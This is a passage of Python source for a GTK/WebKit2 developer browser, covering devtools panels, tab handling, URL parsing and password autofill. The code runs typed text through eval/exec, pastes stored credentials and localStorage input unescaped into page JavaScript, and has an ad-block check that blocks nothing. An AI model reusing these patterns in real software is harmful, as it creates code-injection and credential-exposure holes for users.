        self.btn_downloads.set_active(True)
        self.downloads_popover.popup()
        
        def update_progress(dl, l):
            frac = dl.get_estimated_progress()
            pbar.set_fraction(frac)
            lbl_status.set_text(f"{int(frac * 100)}%")
            
        def finish_dl(dl):
            lbl_status.set_text("Finished")
            pbar.set_fraction(1.0)
            btn_cancel.set_label("Open Folder")
            btn_cancel.connect("clicked", lambda b: os.system("xdg-open " + os.path.expanduser("~/Downloads")))
            
        def fail_dl(dl, e):
            lbl_status.set_text("Failed/Cancelled")
            btn_cancel.set_sensitive(False)

        download.connect("received-data", update_progress)
        download.connect("finished", finish_dl)
        download.connect("failed", fail_dl)

    def build_terminal_emulator(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.term_output = Gtk.TextView(); self.term_output.set_editable(False); scroll = Gtk.ScrolledWindow(); scroll.add(self.term_output); box.pack_start(scroll, True, True, 0); entry = Gtk.Entry(); entry.connect("activate", self.on_term_execute); box.pack_start(entry, False, False, 0); return box
    def build_css_panel(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.css_text = Gtk.TextView(); scroll = Gtk.ScrolledWindow(); scroll.add(self.css_text); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Inject CSS to Tab"); btn.connect("clicked", self.on_inject_css); box.pack_start(btn, False, False, 0); return box
    def build_source_viewer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.source_text = Gtk.TextView(); self.source_text.set_editable(False); scroll = Gtk.ScrolledWindow(); scroll.add(self.source_text); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Refresh DOM"); btn.connect("clicked", self.on_fetch_source); box.pack_start(btn, False, False, 0); return box
    def build_cookie_explorer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.cookie_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.cookie_list); box.pack_start(scroll, True, True, 0); return box
    def build_storage_explorer(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); controls = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5); self.ls_key = Gtk.Entry(); self.ls_val = Gtk.Entry(); btn = Gtk.Button(label="+ Add"); btn.connect("clicked", self.on_add_storage); [controls.pack_start(w, True if w != btn else False, True if w != btn else False, 0) for w in (self.ls_key, self.ls_val, btn)]; box.pack_start(controls, False, False, 0); self.storage_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.storage_list); box.pack_start(scroll, True, True, 0); return box
    def build_network_panel(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.network_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.network_list); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Clear"); btn.connect("clicked", self.on_clear_network); box.pack_end(btn, False, False, 0); return box
    def build_js_console(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.js_output = Gtk.TextView(); self.js_output.set_editable(False); self.js_output.get_buffer().set_text("> "); scroll = Gtk.ScrolledWindow(); scroll.add(self.js_output); box.pack_start(scroll, True, True, 0); entry = Gtk.Entry(); entry.connect("activate", self.on_js_execute); box.pack_start(entry, False, False, 0); return box

    def on_js_execute(self, entry):
        if not hasattr(self, 'current_webview'): return
        js_cmd = entry.get_text(); buf = self.js_output.get_buffer(); buf.insert(buf.get_end_iter(), js_cmd + "\n"); entry.set_text("")
        def on_js_finish(w, r, u):
            try:
                val = w.run_javascript_finish(r).get_js_value()
                out = val.to_string() if val.is_string() else str(val.to_double()) if val.is_number() else str(val.to_boolean()) if val.is_boolean() else "null" if val.is_null() else "undefined" if val.is_undefined() else "[Object]"
                buf.insert(buf.get_end_iter(), "<- " + out + "\n> ")
            except Exception as e: buf.insert(buf.get_end_iter(), f"Error: {e}\n> ")
        self.current_webview.run_javascript(js_cmd, None, on_js_finish, None)

    def on_clear_network(self, btn):
        for child in self.network_list.get_children(): self.network_list.remove(child)

    def on_resource_load(self, webview, resource, request):
        uri = request.get_uri(); method = request.get_http_method() or "GET" if hasattr(request, 'get_http_method') else "GET"
        row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        lm = Gtk.Label(label=f"[{method}]"); lm.get_style_context().add_class("bold-label"); lu = Gtk.Label(label=uri); lu.set_halign(Gtk.Align.START)
        hbox.pack_start(lm, False, False, 0); hbox.pack_start(lu, True, True, 0); row.add(hbox); self.network_list.add(row); self.network_list.show_all()
        if self.adblock_enabled and any(ad in uri for ad in ["doubleclick.net", "google-analytics.com", "googlesyndication.com", "amazon-adsystem.com", "adsrvr.org"]): pass

    def refresh_cookies(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.cookie_list.get_children(): self.cookie_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for c in w.run_javascript_finish(r).get_js_value().to_string().split(";"):
                    if "=" not in c: continue
                    k, v = c.split("=", 1); row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                    lk = Gtk.Label(label=k.strip()); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START); lv = Gtk.Label(label=v.strip()); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox); self.cookie_list.add(row)
                self.cookie_list.show_all()
            except: pass
        self.current_webview.run_javascript("document.cookie", None, on_js_finish, None)

    def refresh_storage(self, btn=None):
        if not hasattr(self, 'current_webview'): return
        for child in self.storage_list.get_children(): self.storage_list.remove(child)
        def on_js_finish(w, r, u):
            try:
                for k, v in json.loads(w.run_javascript_finish(r).get_js_value().to_string()).items():
                    row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                    lk = Gtk.Label(label=k); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START); lv = Gtk.Label(label=str(v)); lv.set_halign(Gtk.Align.START)
                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox); self.storage_list.add(row)
                self.storage_list.show_all()
            except: pass
        self.current_webview.run_javascript("JSON.stringify(localStorage);", None, on_js_finish, None)

    def on_add_storage(self, btn):
        k, v = self.ls_key.get_text().strip(), self.ls_val.get_text().strip()
        if k and v: self.current_webview.run_javascript(f"localStorage.setItem('{k}', '{v}');", None, None, None); self.ls_key.set_text(""); self.ls_val.set_text(""); self.refresh_storage()

    def on_fetch_source(self, btn):
        if not hasattr(self, 'current_webview'): return
        def on_js_finish(w, r, u):
            try: self.source_text.get_buffer().set_text(w.run_javascript_finish(r).get_js_value().to_string())
            except: pass
        self.current_webview.run_javascript("document.documentElement.outerHTML", None, on_js_finish, None)

    def on_inject_css(self, btn):
        buf = self.css_text.get_buffer(); css = buf.get_text(buf.get_start_iter(), buf.get_end_iter(), True).replace("`", "\\`")
        self.current_webview.run_javascript(f"var s = document.createElement('style'); s.innerHTML = `{css}`; document.head.appendChild(s);", None, None, None)

    def on_term_execute(self, entry):
        cmd = entry.get_text(); buf = self.term_output.get_buffer(); buf.insert(buf.get_end_iter(), cmd + "\n")
        try: buf.insert(buf.get_end_iter(), str(eval(cmd)) + "\n>>> ")
        except:
            try: exec(cmd); buf.insert(buf.get_end_iter(), "Executed.\n>>> ")
            except Exception as ex: buf.insert(buf.get_end_iter(), f"Error: {ex}\n>>> ")
        entry.set_text("")

    def new_tab(self, url):
        webview = WebKit2.WebView.new_with_user_content_manager(self.user_content)
        webview.connect("resource-load-started", self.on_resource_load)
        settings = webview.get_settings(); settings.set_enable_developer_extras(True)
        ua_val = self.ua_combo.get_active_id() if hasattr(self, 'ua_combo') else 'default'
        if ua_val == 'mobile': settings.set_user_agent("Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1")
        elif ua_val == 'bot': settings.set_user_agent("Googlebot/2.1 (+http://www.google.com/bot.html)")
        webview.set_settings(settings)
        
        if url == "zero://start": webview.load_html(START_PAGE_HTML, "zero://start")
        elif url == "zero://settings": webview.load_html(SETTINGS_PAGE_HTML, "zero://settings")
        elif url.startswith("zero://search?q="):
            q = urllib.parse.unquote(url.split("=")[1])
            engine = self.search_engine_combo.get_active_id()
            webview.load_uri(SEARCH_ENGINES[engine] + urllib.parse.quote(q))
        else: webview.load_uri(url)
            
        scrolled = Gtk.ScrolledWindow(); scrolled.add(webview)
        wid = "tab_" + str(id(webview))
        self.tab_stack.add_named(scrolled, wid)
        
        row = Gtk.ListBoxRow(); row.set_name(wid)
        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
        hbox.set_margin_top(5); hbox.set_margin_bottom(5); hbox.set_margin_start(10); hbox.set_margin_end(5)
        icon = Gtk.Image.new_from_icon_name("text-html-symbolic", Gtk.IconSize.MENU)
        label = Gtk.Label(label="New Tab")
        label.set_halign(Gtk.Align.START); label.set_ellipsize(Pango.EllipsizeMode.END); label.set_max_width_chars(15)
        
        btn_mute = Gtk.ToggleButton(); btn_mute.add(Gtk.Image.new_from_icon_name("audio-volume-high-symbolic", Gtk.IconSize.MENU))
        btn_mute.set_relief(Gtk.ReliefStyle.NONE); btn_mute.set_tooltip_text("Mute Tab")
        btn_mute.connect("toggled", lambda b: self.toggle_mute(wid, b))
        
        btn_close = Gtk.Button(); btn_close.add(Gtk.Image.new_from_icon_name("window-close-symbolic", Gtk.IconSize.MENU))
        btn_close.set_relief(Gtk.ReliefStyle.NONE); btn_close.connect("clicked", lambda b: self.close_tab(wid, b))
        
        hbox.pack_start(icon, False, False, 0); hbox.pack_start(label, True, True, 0); hbox.pack_end(btn_close, False, False, 0); hbox.pack_end(btn_mute, False, False, 0)
        row.add(hbox); row.show_all()
        
        self.tab_listbox.add(row); self.tabs_map[wid] = (webview, row, self.current_workspace); self.tab_stack.show_all()
        self.tab_listbox.select_row(row); self.on_tab_clicked(self.tab_listbox, row)
        
        def on_uri(w, p):
            uri = w.get_uri() or ""
            if self.current_webview == w: self.url_bar.set_text(uri)
            if uri != "zero://start" and uri != "zero://settings" and not uri.startswith("about:"): 
                title = w.get_title() or "Untitled"
                if not self.is_private:
                    self.add_to_popover(self.history_list, title, uri, "text-html-symbolic")
            
        def on_title(w, p):
            title = w.get_title() or "Untitled"
            label.set_text(title)
            if self.current_webview == w: self.header.set_title(title)
            
        def on_load(w, ev):
            if ev == WebKit2.LoadEvent.FINISHED:
                u = w.get_uri()
                if u and not self.is_private:
                    domain = urllib.parse.urlparse(u).hostname
                    if domain in self.passwords:
                        cred = self.passwords[domain]
                        js = f"setTimeout(() => {{ let p = document.querySelector('input[type=\"password\"]'); if(p) {{ p.value = '{cred['pass']}'; let u = document.querySelector('input[type=\"text\"], input[type=\"email\"]'); if(u) u.value = '{cred['user']}'; }} }}, 500);"
                        w.run_javascript(js, None, None, None)
                        
        webview.connect("notify::uri", on_uri); webview.connect("notify::title", on_title); webview.connect("load-changed", on_load)

    def on_url_activate(self, entry):
        url = entry.get_text()
        if url == "zero://start":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(START_PAGE_HTML, "zero://start")
            return
        elif url == "zero://settings":
            if hasattr(self, 'current_webview'): self.current_webview.load_html(SETTINGS_PAGE_HTML, "zero://settings")
            return
            
        if url.startswith("/"):
            if os.path.exists(url): url = "file://" + os.path.abspath(url)
        elif not url.startswith("http") and not url.startswith("zero://") and not url.startswith("file://"): 
            if "." in url and " " not in url:
                url = "https://" + url
            else:
                engine = self.search_engine_combo.get_active_id()
                url = SEARCH_ENGINES[engine] + urllib.parse.quote(url)
        if hasattr(self, 'current_webview'): self.current_webview.load_uri(url)

    def setup_css(self):
        css = b'''
            .bold-label { font-weight: bold; }
            .dim-label { color: #888888; font-size: 11px; }
            .vertical-tabs-box { background: #16181D; border-right: 1px solid rgba(255,255,255,0.05); }
            .tabs-header { color: #8090A0; font-size: 11px; font-weight: bold; letter-spacing: 1px; }
            .vertical-tabs-list { background: transparent; }
            .vertical-tabs-list row { padding: 4px; border-radius: 6px; margin: 2px 6px; transition: all 0.2s; }
            .vertical-tabs-list row:hover { background: rgba(255,255,255,0.05); }
            .vertical-tabs-list row:selected { background: rgba(77,144,254,0.15); border: 1px solid rgba(77,144,254,0.3); }
            .private-header { background: #4a148c; border-bottom: 2px solid #8e24aa; }
        '''
        provider = Gtk.CssProvider(); provider.load_from_data(css)
        Gtk.StyleContext.add_provider_for_screen(Gdk.Screen.get_default(), provider, Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)

if __name__ == "__main__":
    win = ZeroDevBrowser()
    win.connect("destroy", Gtk.main_quit)
    win.show_all()
    Gtk.main()
